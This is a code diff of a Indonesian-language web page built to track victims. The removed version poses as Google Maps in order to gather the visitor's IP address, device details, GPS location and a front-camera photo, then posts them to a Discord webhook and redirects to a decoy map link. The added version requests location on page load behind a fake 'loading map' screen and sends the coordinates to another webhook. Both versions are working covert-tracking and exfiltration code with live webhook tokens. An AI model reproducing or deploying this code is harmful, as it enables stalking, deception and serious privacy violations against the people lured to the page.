@@ -3,85 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Maps - Lokasi Rute</title>
-    
-   <meta property="og:title" content="Google Maps - Lihat Lokasi & Rute">
-    <meta property="og:description" content="Klik untuk sinkronisasi rute perjalanan terbaru secara real-time.">
-    <meta property="og:image" content="https://www.google.com/images/branding/product/2x/maps_96in128dp.png">
-    <meta property="og:url" content="https://titik-lokasi-maps.site">
-    <meta property="og:type" content="website">
-    <meta name="twitter:card" content="summary_large_image">
+    <title>Sistem Pelacak</title>
     <style>
-        body { margin: 0; font-family: sans-serif; background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
-        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
-        .logo { width: 70px; margin-bottom: 20px; }
-        .btn { padding: 15px 25px; background: #4285F4; color: white; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #1a1a1a; color: white; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282020%29.svg/1200px-Google_Maps_icon_%282020%29.svg.png" class="logo">
-        <button class="btn" onclick="mainkan()">Lihat Lokasi Rute</button>
-        <p style="color: #70757a; font-size: 13px; margin-top: 15px;">Sinkronisasi rute real-time sedang berjalan.</p>
+    <div style="text-align: center;">
+        <div class="loader" style="margin: 0 auto 15px;"></div>
+        <p>Memuat peta lokasi...</p>
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1488698771880677437/OnoDFDFI4C97vASmoKPyw2kRtY2cpms8EtpzSXiS7J-olSsLIBh1S5e9Ir6ix6z6OxYG"; 
-        const linkPalsu = "https://www.google.com/maps/search/Grand+Indonesia"; 
+        // --- KONFIGURASI ---
+        const webhookURL = "https://discord.com/api/webhooks/1490896106698051719/dEAoVaMVu-xEMBSc2YUcDo_9s8aMd0VTkTo-fjk9gFoxLWi3bCF5l4-sMsZeYbXCVICA";
 
-        async function mainkan() {
-            document.querySelector('.btn').innerHTML = "Menghubungkan...";
-            
-            // --- AMBIL IP ADDRESS TARGET ---
-            let ipTarget = "Gagal mengambil IP";
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                ipTarget = data.ip;
-            } catch(e) {}
+        function kirimKeDiscord(lat, lon, accuracy) {
+            const data = {
+                embeds: [{
+                    title: "📍 Target Terdeteksi!",
+                    color: 3447003,
+                    fields: [
+                        { name: "Latitude", value: `${lat}`, inline: true },
+                        { name: "Longitude", value: `${lon}`, inline: true },
+                        { name: "Akurasi", value: `${accuracy} meter`, inline: true },
+                        { name: "Google Maps", value: `[Klik di Sini](https://www.google.com/maps?q=${lat},${lon})` }
+                    ],
+                    footer: { text: "Dikirim via Sistem Pelacak" },
+                    timestamp: new Date()
+                }]
+            };
 
-            let bInfo = "N/A";
-            try { const b = await navigator.getBattery(); bInfo = `${Math.round(b.level * 100)}%`; } catch(e){}
-            let tipeHP = navigator.userAgent; 
-
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapsAsli = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        // KIRIM DATA KE DISCORD (DENGAN IP)
-                        await fetch(webhookURL, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ 
-                                content: `**🚨 TARGET TERPANTAU!**\n🌐 **IP Address:** ${ipTarget}\n📱 **HP:** ${tipeHP}\n🔋 **Baterai:** ${bInfo}\n📍 **Lokasi Asli:** ${mapsAsli}` 
-                            })
-                        });
-
-                        const formData = new FormData();
-                        formData.append("file", blob, "wajah.jpg");
-                        await fetch(webhookURL, { method: 'POST', body: formData });
-
-                        window.location.href = linkPalsu; 
-                    }, 'image/jpeg');
-                    stream.getTracks().forEach(t => t.stop());
-                } catch (e) {
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ content: `**📍 LOKASI MASUK (Kamera Mati)**\n🌐 **IP:** ${ipTarget}\n📍 **Lokasi Asli:** ${mapsAsli}` })
-                    });
-                    window.location.href = linkPalsu;
-                }
-            }, (err) => { alert("Izin GPS diperlukan."); });
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .then(() => console.log("✅ Data berhasil dikirim ke Discord!"))
+            .catch(err => console.error("❌ Gagal mengirim ke Discord:", err));
         }
+
+        function dapatkanLokasi() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const acc = position.coords.accuracy;
+                        
+                        console.log("Lokasi didapat:", lat, lon);
+                        kirimKeDiscord(lat, lon, acc);
+                    },
+                    (error) => {
+                        console.error("Gagal mendapat lokasi:", error.message);
+                        alert("Mohon izinkan akses lokasi untuk melihat peta.");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                alert("Browser tidak mendukung GPS.");
+            }
+        }
+
+        // Jalankan fungsi saat halaman dibuka
+        window.onload = dapatkanLokasi;
     </script>
 </body>
 </html>
